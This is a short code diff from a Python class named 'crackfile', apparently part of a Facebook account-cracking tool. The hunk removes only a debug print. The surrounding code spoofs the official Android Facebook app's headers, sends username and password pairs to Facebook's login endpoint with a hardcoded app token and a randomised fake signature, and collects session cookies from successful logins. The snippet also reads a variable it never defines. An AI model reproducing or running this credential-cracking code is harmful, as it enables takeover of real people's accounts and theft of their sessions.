@@ -45,7 +45,6 @@ class crackfile:
                         flame = "[FBAN/FB4A;FBAV/307.0.0.53.7;FBBV/354336875;FBDM/{density=2.0,width=720,height=1384};FBLC/en_GB;FBRV/0;FBCR/AIRTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-G930F;FBSV/6.0;FBOP/12;FBCA/armeabi-v7a:armeabi;]"
                         head = {'Host':'graph.facebook.com','x-fb-connection-bandwidth': repr(random.randint(2e7, 3e7)), 'x-fb-sim-hni': repr(random.randint(2e4, 4e4)), 'x-fb-net-hni': repr(random.randint(2e4, 4e4)),'x-fb-connection-quality': 'EXCELLENT','user-agent': flame1,'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                         date = {'access_token': '200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',  'format': 'JSON', 'sdk_version': {random.randrange(2, 31)}, 'email': username, 'locale': 'en_GB', 'password': password, 'sdk': 'android', 'generate_session_cookies': '1', 'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'} 
-                        print(date)
                         flx = self.ses.post("https://graph.facebook.com/auth/login", params=date, headers=head, allow_redirects=False).json()
                         if "session_key" in flx: 
                               coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
